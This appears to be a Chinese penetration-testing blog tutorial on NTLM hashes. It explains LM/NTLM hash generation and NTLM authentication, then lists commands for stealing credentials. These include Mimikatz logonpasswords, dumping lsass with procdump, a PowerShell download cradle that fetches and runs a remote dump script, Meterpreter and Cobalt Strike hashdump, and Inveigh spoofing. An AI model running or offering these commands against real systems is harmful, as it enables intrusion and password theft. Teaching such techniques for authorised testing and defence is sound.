<!DOCTYPE HTML>
<html lang="zh-CN">
<head>
    

<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?48851b97e1ed0c9c199b9a7c27cc1cf7";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>



<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <meta name="keywords" content="域渗透之NTML-Hash, ssooking&#39;s blog">
    <meta name="description" content="一、认识Windows HASH​    早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge/Response”验证机制，简称LM，它是如此简单以至很容易被破解。微软提出了WindowsNT挑战/响应验">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>域渗透之NTML-Hash | ssooking&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/css/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
<link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>

</head>

<body>

<header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="container">
            <div class="nav-wrapper">
                <div class="brand-logo">
                    <a href="/" class="waves-effect waves-light">
                        
                        <img src="/medias/logo.png" class="logo-img hide-on-small-only">
                        
                        <span class="logo-span">ssooking's blog</span>
                    </a>
                </div>
                <a href="#" data-activates="mobile-nav" class="button-collapse"><i class="fa fa-navicon"></i></a>
<ul class="right">
    
    <li class="hide-on-med-and-down">
        <a href="/" class="waves-effect waves-light">
            
            <i class="fa fa-home"></i>
            
            <span>Index</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/tags" class="waves-effect waves-light">
            
            <i class="fa fa-tags"></i>
            
            <span>Tags</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/categories" class="waves-effect waves-light">
            
            <i class="fa fa-bookmark"></i>
            
            <span>Categories</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/archives" class="waves-effect waves-light">
            
            <i class="fa fa-archive"></i>
            
            <span>Archives</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/about" class="waves-effect waves-light">
            
            <i class="fa fa-user-circle-o"></i>
            
            <span>About</span>
        </a>
    </li>
    
    <li>
        <a id="toggleSearch" class="waves-effect waves-light">
            <i id="searchIcon" class="mdi-action-search"></i>
        </a>
    </li>

</ul>

<div class="side-nav" id="mobile-nav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">ssooking's blog</div>
        <div class="logo-desc">
            
            征途漫漫，步履铿锵，无畏、无惧、无阻！
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li>
            <a href="/" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-home"></i>
                
                Index
            </a>
        </li>
        
        <li>
            <a href="/tags" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-tags"></i>
                
                Tags
            </a>
        </li>
        
        <li>
            <a href="/categories" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-bookmark"></i>
                
                Categories
            </a>
        </li>
        
        <li>
            <a href="/archives" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-archive"></i>
                
                Archives
            </a>
        </li>
        
        <li>
            <a href="/about" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-user-circle-o"></i>
                
                About
            </a>
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/ssooking" class="waves-effect waves-light" target="_blank">
                <i class="fa fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>

    <div class="social-link"><a href="https://github.com/ssooking" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
    <i class="fa fa-github"></i>
</a>
<a href="mailto:ssooking@yeah.net" class="tooltipped" target="_blank" data-tooltip="mail：ssooking@yeah.net" data-position="top" data-delay="50">
    <i class="fa fa-envelope-open"></i>
</a>



<a href="https://join.skype.com/invite/PWgoTe4YvrbH" class="tooltipped" target="_blank" data-tooltip="skype：ssooking" data-position="top" data-delay="50">
    <i class="fa fa-skype"></i>
</a>

</div>
</div>

            </div>
        </div>

        
        <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/ssooking" class="github-corner tooltipped hide-on-med-and-down" target="_blank" data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewbox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/>
    </svg>
</a>
        
    </nav>
</header>



<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
    <div class="container">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <div class="description center-align post-title">
                        域渗透之NTML-Hash
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>



<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1,
    #articleContent h2,
    #articleContent h3,
    #articleContent h4,
    #articleContent h5,
    #articleContent h6 {
        padding-top: 76px;
        margin-top: -76px;
    }

    #articleContent h1 {
        line-height: 3.5rem;
    }

    #articleContent h2 {
        line-height: 3.2rem;
    }

    #articleContent h3 {
        line-height: 2.8rem;
    }

    #articleContent h4 {
        line-height: 2.5rem;
    }

    #articleContent h5 {
        line-height: 2.2rem;
    }

    #articleContent h6 {
        line-height: 1.9rem;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link::before {
        background-color: #42b983;
    }
</style>
<div class="row">
    <div class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            
            <div class="article-tag">
                
                <a href="/tags/内网渗透/" target="_blank">
                    <span class="chip bg-color">内网渗透</span>
                </a>
                
                <a href="/tags/域渗透/" target="_blank">
                    <span class="chip bg-color">域渗透</span>
                </a>
                
                <a href="/tags/NTML-Hash/" target="_blank">
                    <span class="chip bg-color">NTML-Hash</span>
                </a>
                
            </div>
            
            <div class="post-info">
                
                <span class="post-cate">
                    <i class="fa fa-bookmark fa-fw icon-category"></i>
                    
                    <a href="/categories/攻防渗透/" class="post-category" target="_blank">
                        攻防渗透
                    </a>
                    
                </span>
                

                <span class="post-date">
                    <i class="fa fa-clock-o fa-fw"></i>2018-12-03
                </span>
            </div>
        </div>
        <hr>
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="一、认识Windows-HASH"><a href="#一、认识Windows-HASH" class="headerlink" title="一、认识Windows HASH"></a>一、认识Windows HASH</h1><p>​    早期SMB协议在网络上传输明文口令。后来出现”LAN Manager Challenge/Response”验证机制，简称LM，它是如此简单以至很容易被破解。微软提出了WindowsNT挑战/响应验证机制，称之为NTLM。现在已经有了更新的NTLMv2以及Kerberos验证体系。Windows加密过的密码口令，我们称之为hash（中文：哈希），Windows的系统密码hash默认情况下一般由两部分组成：第一部分是LM-hash，第二部分是NTLM-hash。</p>
<p>​     NTLM-Hash与LM-Hash算法相比，明文口令大小写敏感，但无法根据NTLM-Hash判断原始明文口令是否小于8字节，摆脱了魔术字符串”KGS!@#$%”。MD4是真正的单向哈希函数，穷举做为数据源出现的明文，难度较大。问题在于，微软一味强调NTLM-Hash的强度高，却避而不谈一个事实，为了保持向后兼容性，NTLM-Hash缺省总是与LM-Hash一起使用的。这意味着NTLM-Hash强调再高也是无助于安全的，相反潜在损害着安全性。增加NTLM-Hash后，首先利用LM-Hash的弱点穷举出原始明文口令的大小写不敏感版本，再利用NTLM-Hash修正出原始明文口令的大小写敏感版本</p>
<h2 id="LM-HASH"><a href="#LM-HASH" class="headerlink" title="LM HASH"></a>LM HASH</h2><p>​    <code>LM HASH</code>是一种较古老的Hash，在<code>LAN Manager</code>协议中使用，非常容易通过暴力破解获取明文凭据。Vista以前的Windows OS使用它，Vista之后的版本默认禁用了LM协议，但某些情况下还是可以使用。</p>
<p><strong>补充：</strong></p>
<p><code>Windows Vista</code>和<code>Windows Server 2008</code>以前的系统还会使用LM hash。LM hash的生成方法本文暂不介绍。自Vista和2008开始，Windows取消LM hash，但某些工具的参数需要填写固定格式<code>LM hash:NT hash</code>，可以将LM Hash填0(LM hash可以为任意值)，即<code>00000000000000000000000000000000:NT hash</code></p>
<h2 id="NTLM-HASH"><a href="#NTLM-HASH" class="headerlink" title="NTLM HASH"></a>NTLM HASH</h2><p>​    <code>NTLM Hash（NT LAN Manager）</code>是支持<code>Net NTLM</code>认证协议及<code>本地认证</code>过程中的一个重要参数。其长度为32位，由数字与字母组成。它的前身是<code>LM Hash</code>，目前基本淘汰，两者相差不大，只是使用的加密算法不同。</p>
<p><strong>本地认证</strong>：Windows不存储用户的明文密码，它会将用户的明文密码经过加密后存储在<code>SAM (Security Account Manager Database，安全账号管理数据库)</code>中。SAM文件的路径是<code>%SystemRoot%\system32\config\sam</code>。在进行本地认证的过程中，当用户登录时，系统将用户输入的明文密码加密成NTLM Hash，与SAM数据库中的NTLM Hash进行比较，从而实现认证。</p>
<blockquote>
<p>Note：类似的，在域环境下，DC (Domain Controller，域控制器)中也存在这样的数据库<code>AD (Account Database)</code>，位于<code>ntds.dit</code>文件</p>
</blockquote>
<p>NTLM是一种网络认证协议，与NTLM Hash的关系就是：NTLM网络认证协议是以NTLM Hash作为根本凭证进行认证的协议。在本地认证的过程中，其实就是将用户输入的密码转换为NTLM Hash与SAM中的NTLM Hash进行比较。</p>
<p>通常意义上的<code>NTLM Hash</code>指存储在<code>SAM</code>数据库及<code>NTDS数据库</code>中对密码进行Hash摘要计算后的结果，这类Hash可以直接用于PTH，并且通常存在于<code>LSASS</code>进程中，便于SSP使用。</p>
<p>本地认证流程</p>
<pre><code>winlogon.exe -&gt; 接收用户输入 -&gt; lsass.exe -&gt; (认证)
</code></pre><p>首先，用户注销、重启、锁屏后，操作系统会让winlogon显示登录界面，也就是输入框，接收输入后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，对比SAM数据库中的hash进行验证。</p>
<ul>
<li>Windows Logon Process(即 winlogon.exe)，是Windows NT 用户登 陆程序，用于管理用户登录和退出。</li>
<li>LSASS用于微软Windows系统的安全机 制。它用于本地安全和登陆策略。</li>
</ul>
<p>在系统中，hash格式是类似这样的：</p>
<pre class=" language-bash"><code class="language-bash">ssooking:1001:AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF:::
Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4:::
</code></pre>
<h2 id="NTLM-Hash的生成"><a href="#NTLM-Hash的生成" class="headerlink" title="NTLM-Hash的生成"></a>NTLM-Hash的生成</h2><p>用户密码为<code>test123</code></p>
<p>转换成十六进制的格式为<code>74657374313233</code></p>
<p>转换成Unicode格式为<code>7400650073007400310032003300</code></p>
<p>对字符串<code>7400650073007400310032003300</code>以十六进制格式作MD4加密，结果为<code>c5a237b7e9d8e708d8436b6148a25fa1</code></p>
<p><strong>注：</strong></p>
<p>MD4加密可使用工具HashCalc，如下图</p>
<p>IBM设计的LM Hash算法存在几个弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，NTLM Hash便应运而生。假设明文口令是<code>123456</code>，首先转换成<code>Unicode</code>字符串，与LM Hash算法不同，这次不需要添加0补足14字节</p>
<p><code>123456</code> -&gt; <code>310032003300340035003600</code>。</p>
<blockquote>
<p>从<code>ASCII</code>串转换成Unicode串时，使用<code>little-endian(小端)</code>序。0x80之前的标准ASCII码转换成Unicode码，就是简单地从0x??变成 0×00??。此类标准ASCII串按little-endian序转换成Unicode串，就是简单地在原有每个字节之后添加0×00。</p>
</blockquote>
<p>对所获取的 Unicode串进行标准MD4单向哈希，无论数据源有多少字节，MD4固定产生128-bit的哈希值，</p>
<p>16字节 <code>310032003300340035003600</code>- 进行标准MD4单向哈希 -&gt; <code>32ED87BDB5FDC5E9CBA88547376818D4</code>，</p>
<p>就得到了最后的NTLM Hash：<code>32ED87BDB5FDC5E9CBA88547376818D4</code></p>
<p>实验环境下，测试服务器可以先关闭密码复杂性策略，设置一个简单的密码。</p>
<blockquote>
<p>gpedit.msc – 本地组策略编辑器 – 计算机配置 - windows设置 - 安全设置 - 帐户策略 - 密码策略</p>
</blockquote>
<p>后文以Adminstrator NTML Hash 为例。明文密码为<code>toor</code></p>
<pre class=" language-bash"><code class="language-bash">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF:::
</code></pre>
<h1 id="二、NTML网络认证机制"><a href="#二、NTML网络认证机制" class="headerlink" title="二、NTML网络认证机制"></a>二、NTML网络认证机制</h1><h2 id="NTLM-协议"><a href="#NTLM-协议" class="headerlink" title="NTLM 协议"></a>NTLM 协议</h2><p>​    NTLM是除<code>Kerberos</code>之外的一种网络认证协议，只支持Windows。它是一种基于质询/应答 (Challenge/Response)消息交换模式的认证机制， 常用于<u>工作组</u>和<u>域环境</u>下<code>登录场景的身份认证</code>。</p>
<h2 id="基于NTML协议的身份认证机制"><a href="#基于NTML协议的身份认证机制" class="headerlink" title="基于NTML协议的身份认证机制"></a>基于NTML协议的身份认证机制</h2><p>​    NTML网络认证采用质询/应答 (Challenge/Response) 模式进行数据交换，通过传输加密的<code>Challenge/Response</code>值并进行对比，从而验证用户身份。NTML网络认证会使用用户密码的Hash作为密钥，来加密<code>Challenge</code>，用户只有在输对密码的情况下，才能够同样利用密码的hash进行解密。这样通过对比两端的计算结果来判断凭据是否有效，从而实现身份认证。这样的好处是，用户的密码不会在网络链路中传输，加密之后的Challenge值取代原本密码的作用进行对比验证，与传统传输密码的方式相比，具有较高的安全性。</p>
<p>通过交互过程中维护的<code>凭证（credential）</code>，包括域名、用户名、用户密码的hash串</p>
<blockquote>
<p>ps：域名信息会自动在数据包中携带，无需用户手动输入。</p>
</blockquote>
<p><strong>NTLM的认证过程</strong>分为三步：协商、质询、验证：</p>
<ul>
<li><strong>协商</strong>：主要用于确认双方协议版本</li>
<li><strong>质询</strong>：质询/应答 (Challenge/Response) 模式，用于消息交换</li>
<li><strong>验证</strong>：验证身份合法性，通常由Server端或域控制器完成这个过程</li>
</ul>
<p><strong>NTML的认证方式</strong>分为<code>Interactive（交互式）</code>和<code>Noninteractive（非交互式）</code>：</p>
<p><code>交互式验证</code>：交互式提供必要凭据，通常应用场景通常为登录，即用户要登录某台客户端。</p>
<p><code>非交互式验证</code>：无需交互式提供凭据，在实际应用中，比如命令行直接指定用户名、密码的方式登录，再比如我们在客户端上使用<code>net use</code>命令去映射服务器上某个共享文件夹的方式，这些便属于属于非交互式认证。但非交互式认证的应用场景更多的是<u><strong>已登录某客户端的用户去请求另一台服务器的资源</strong></u> ，或者为单点登录（SSO）的方式，即用户只需要登录一次即可访问所有相互信任的应用系统及共享资源。</p>
<pre><code>net use x: \\17.10.0.10\$share /u:administrator password
</code></pre><p>NTML认证机制在<code>工作组</code>环境下和在<code>域环境</code>下是不同的。</p>
<p>​    <strong>工作组</strong>和<strong>域</strong>宏观上都是一群计算机的集合，域中计算机的数量规模通常大于工作组内的计算机。在认证体系中，工作组和域的主要区别在于，工作组内的机器名义上虽然是属于一个集合，但是内部各计算机还是各自管理各自的，没有一个相对成熟的信任机制，工作组内各个计算机的关系依旧是<code>点对点</code>的。因此，在工作组环境下进行访问认证，仅涉及<strong>Client</strong>和<strong>Server</strong>。我们使用的个人计算机，默认便处于WORKGROUP工作组环境下。</p>
<p>​    域是一个有安全边界的计算机集合，同一个域中的计算机通过<code>共同的第三方信任机构</code>建立信任关系，这个第三方信任机构角色由<code>DC (Domain Controller，域控制器)</code> 担当。通俗来讲，域中的机器都信任域控制器，那么只要域控制器信任我们，我们就可以在域内获得对其他服务器的访问权限。在这种认证体系中涉及三方：<strong>Client、Server、DC</strong> 。</p>
<blockquote>
<p>注意：在Windows域环境下涉及三方的<strong>访问认证</strong>场景中，即客户端想要访问服务器资源的情况下，采用 <strong>基于Kerberos协议的网络认证机制</strong>，<u>NTML认证机制参与认证过程</u>。此部分详细内容请参考<a href="">域渗透之Kerberos</a> 。</p>
</blockquote>
<p>​    下面我们就来分别介绍一下在工作组和域环境下，基于NTML协议的网络认证机制的工作流程。以交互式为例。</p>
<h2 id="工作组环境NTML认证流程"><a href="#工作组环境NTML认证流程" class="headerlink" title="工作组环境NTML认证流程"></a>工作组环境NTML认证流程</h2><p>工作组中，涉及Clinet、Server，流程如下：</p>
<ul>
<li>用户访问客户端计算机并输入用户名和密码信息，尝试进行登录</li>
<li>客户端计算机对密码进行哈希处理并缓存密码hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li>
<li>服务器生成一个16字节的随机数，称为<strong><em>质询</em> (challenge)</strong> 或<a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85" target="_blank" rel="noopener"><em>随机数 (nonce)</em></a>.aspx)，并将<em>challenge</em>发送给客户端</li>
<li>客户端使用缓存的<strong><em>用户密码的哈希值</em></strong>对此<em>challenge</em>进行加密，加密结果为Response (响应)，然后将Username、Challenge、Response<code>（Net-NTML hash）</code>发送给服务器。</li>
<li>服务器使用username从SAM帐户数据库中检索用户密码的hash，使用该hash来加密challenge，并与客户端计算的响应值进行比较。如果它们相同，则验证成功。</li>
</ul>
<h2 id="域环境NTML认证流程"><a href="#域环境NTML认证流程" class="headerlink" title="域环境NTML认证流程"></a>域环境NTML认证流程</h2><p>在域环境下多了域控制器的角色，微软给出的说明是这样的：</p>
<blockquote>
<ol>
<li>(Interactive  authentication only) A user accesses a client computer and provides a  domain name, user name, and password. The client computes a  cryptographic <a href="https://msdn.microsoft.com/en-us/library/ms721586(v=VS.85" target="_blank" rel="noopener"><em>hash</em></a>.aspx) of the password and discards the actual password.</li>
<li>The client sends the user name to the server (in <a href="https://msdn.microsoft.com/en-us/library/ms721603(v=VS.85" target="_blank" rel="noopener"><em>plaintext</em></a>.aspx)).</li>
<li>The server generates a 16-byte random number, called a <em>challenge</em> or <a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85" target="_blank" rel="noopener"><em>nonce</em></a>.aspx), and sends it to the client.</li>
<li>The client encrypts this challenge with the hash of the user’s  password and returns the result to the server. This is called the <em>response</em>.</li>
<li>The server sends the following three items to the domain controller:<ul>
<li>User name</li>
<li>Challenge sent to the client</li>
<li>Response received from the client</li>
</ul>
</li>
<li>The domain controller uses the user name to retrieve the hash of  the user’s password from the Security Account Manager database. It uses  this password hash to encrypt the challenge.</li>
<li>The domain controller compares the  encrypted challenge it computed (in step 6) to the response computed by  the client (in step 4). If they are identical, authentication is  successful.</li>
</ol>
</blockquote>
<p>翻译过来流程大致如下：</p>
<ol>
<li>用户访问客户端计算机并输入用户名和密码信息，尝试进行登录</li>
<li>客户端计算机对密码进行哈希处理并缓存密码hash，丢弃实际的明文密码(不存储)，然后将用户名发送到服务器，发起认证请求</li>
<li>服务器生成一个16字节的随机数，称为<strong><em>质询</em> (challenge)</strong> 或<a href="https://msdn.microsoft.com/en-us/library/ms721596(v=VS.85" target="_blank" rel="noopener"><em>随机数 (nonce)</em></a>.aspx)，并将<em>challenge</em>发送给客户端</li>
<li>客户端使用缓存的<strong><em>用户密码的哈希值</em></strong>对此<em>challenge</em>进行加密，加密结果为Response (响应)，然后将Username、Challenge、Response<code>（Net-NTML hash）</code>发送给服务器</li>
<li>服务器将<strong><em>Username、Challenge、Response</em></strong><code>（Net-NTML hash）</code>发送给<strong><em>DC (Domain Controller，域控制器)</em></strong></li>
<li>DC域控制器从<strong><em>AD (Account Database，帐户数据库)</em></strong> 中检索该用户名，并提取用户密码的NTML hash，使用该hash来加密challenge，并且把这个值和客户端计算的响应值进行比较。如果它们相同，则验证成功。</li>
</ol>
<h1 id="三、如何拿到Hash"><a href="#三、如何拿到Hash" class="headerlink" title="三、如何拿到Hash?"></a>三、如何拿到Hash?</h1><h2 id="1-本地获取"><a href="#1-本地获取" class="headerlink" title="1.本地获取"></a>1.本地获取</h2><p>在渗透测试中，通常可从Windows系统中的<code>SAM</code>文件和域控的<code>NTDS.dit</code>文件中获得用户hash，通过读取<code>lsass.exe</code>进程能获得已登录用户的NTLM hash。许多工具能够方便地为我们完成这些工作。但需要注意的是：</p>
<blockquote>
<p>大部分这种本地抓取hash的工具都需要管理员权限</p>
</blockquote>
<p>常用工具：</p>
<ul>
<li><a href="https://code.google.com/p/quarkspwdump/downloads/detail?name=QuarksPwDump_v0.2b.zip&amp;can=2&amp;q=" target="_blank" rel="noopener">QuarksPwDump</a></li>
<li><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></li>
<li><a href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" target="_blank" rel="noopener">ProDump</a></li>
<li><a href="https://www.offensive-security.com/metasploit-unleashed/Mimikatz/" target="_blank" rel="noopener">Metasploit</a></li>
<li>Cobaltstrike</li>
</ul>
<h3 id="QuarksPwDump"><a href="#QuarksPwDump" class="headerlink" title="QuarksPwDump"></a><a href="https://code.google.com/p/quarkspwdump/downloads/detail?name=QuarksPwDump_v0.2b.zip&amp;can=2&amp;q=" target="_blank" rel="noopener">QuarksPwDump</a></h3><pre class=" language-bash"><code class="language-bash">quarkspwdump.exe -dhl
</code></pre>
<h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></h3><pre class=" language-bash"><code class="language-bash">privilege::debug
sekurlsa::logonpasswords
</code></pre>
<p>更方便的mimikatz命令</p>
<pre class=" language-bash"><code class="language-bash">mimikatz.exe <span class="token string">"privilege::debug"</span> <span class="token string">"sekurlsa::logonpasswords full"</span>
</code></pre>
<p>执行以下命令除了回显，还可以dump结果并将hash保存为log日志文件：</p>
<pre class=" language-bash"><code class="language-bash">mimikatz.exe <span class="token string">""</span>privilege::debug<span class="token string">""</span> <span class="token string">""</span>log sekurlsa::logonpasswords full<span class="token string">""</span> <span class="token keyword">exit</span>
</code></pre>
<h3 id="ProDump"><a href="#ProDump" class="headerlink" title="ProDump"></a><a href="https://technet.microsoft.com/en-us/sysinternals/dd996900.aspx" target="_blank" rel="noopener">ProDump</a></h3><p><code>prodump</code>是微软提供的一个命令行实用程序，用于监视应用程序并生成故障转储。我们可以用它先dump对方主机的<code>LSASS</code>内存文件，然后在自己主机用<code>mimikatz</code>等工具进行处理。这种方式的好处是可以避免被查杀。先转储<code>LSASS</code>内存文件：</p>
<pre class=" language-bash"><code class="language-bash">procdump.exe -accepteula -ma lsass.exe lsass.dmp
</code></pre>
<p>然后本地用<code>mimikatz</code>对<code>LSASS</code>内存文件进行破解：</p>
<pre class=" language-bash"><code class="language-bash">mimikatz.exe <span class="token string">"sekurlsa::minidump lsass.dmp"</span>
sekurlsa::logonpasswords
</code></pre>
<p>类似<code>ProDump</code>的工具还有：<strong>fgdump</strong>、<strong>pwdump</strong>、<strong>cachedump</strong>等。利用powershell也能够像<code>Prodump</code>一样转储lsass文件：</p>
<pre class=" language-powershell"><code class="language-powershell">powershell <span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token string">"Get-Process lsass | Out-Minidump"</span>
</code></pre>
<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><a href="https://www.offensive-security.com/metasploit-unleashed/Mimikatz/" target="_blank" rel="noopener">Metasploit</a></h3><p>首先需要获取<code>SYSTEM</code>权限</p>
<pre class=" language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> getuid
meterpreter <span class="token operator">></span> getsystem
<span class="token punctuation">..</span>.got system via technique 1 <span class="token punctuation">(</span>Named Pipe Impersonation <span class="token punctuation">(</span>In Memory/Admin<span class="token punctuation">))</span>.
meterpreter <span class="token operator">></span> getuid
Server username: NT AUTHORITY\SYSTEM
</code></pre>
<p>在<code>metasploit</code>中利用<code>mimikatz</code>获取hash</p>
<pre class=" language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> load mimikatz
meterpreter <span class="token operator">></span> mimikatz_command -f samdump::hashes
</code></pre>
<p><code>metasploit</code>提供的抓取hash的一些模块：</p>
<pre class=" language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> run post/windows/gather/hashdump
meterpreter <span class="token operator">></span> run post/windows/gather/smart_hashdump
</code></pre>
<p><code>smart_hashdump</code>模块会把dump的hash文件保存在<code>/root/.msf4/loot</code>目录下，并且该模块一定程度上能够绕过<code>windows UAC</code>。</p>
<p>顺便介绍一些能够直接获取明文密码的模块命令：</p>
<pre class=" language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> load mimikatz
meterpreter <span class="token operator">></span> wdigest （kerberos）

meterpreter <span class="token operator">></span> mimikatz_command -f samdump::hashes
meterpreter <span class="token operator">></span> mimikatz_command -f sekurlsa::searchPasswords 

meterpreter<span class="token operator">></span>load kiwi
meterpreter<span class="token operator">></span> creds_wdigest
</code></pre>
<h3 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h3><pre><code>beacon&gt; getuid
beacon&gt; powershell-import /root/powershell/Get-PassHashes.ps1
beacon&gt; powershell Get-PassHashes
</code></pre><p> 读取hash，需要administer权限(右击目标主机–<code>Access</code>-<code>hashdump</code>)</p>
<pre class=" language-bash"><code class="language-bash">beacon<span class="token operator">></span> wdigest //读取信息
beacon<span class="token operator">></span> hashdump  
</code></pre>
<p>运行mimikatz(右击目标主机–<code>Access</code>- <code>RUN mimikatz</code>)</p>
<pre class=" language-bash"><code class="language-bash">beacon<span class="token operator">></span> logonpasswords 
</code></pre>
<p>右击受害者主机–access-hashdump</p>
<pre class=" language-bash"><code class="language-bash">beacon<span class="token operator">></span> powershell-import /root/powershell/Inveigh/Inveigh.ps1
beacon<span class="token operator">></span> powershell Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -NBNS Y -mDNS Y -LLMNR Y -HTTP Y -PROXY Y
</code></pre>
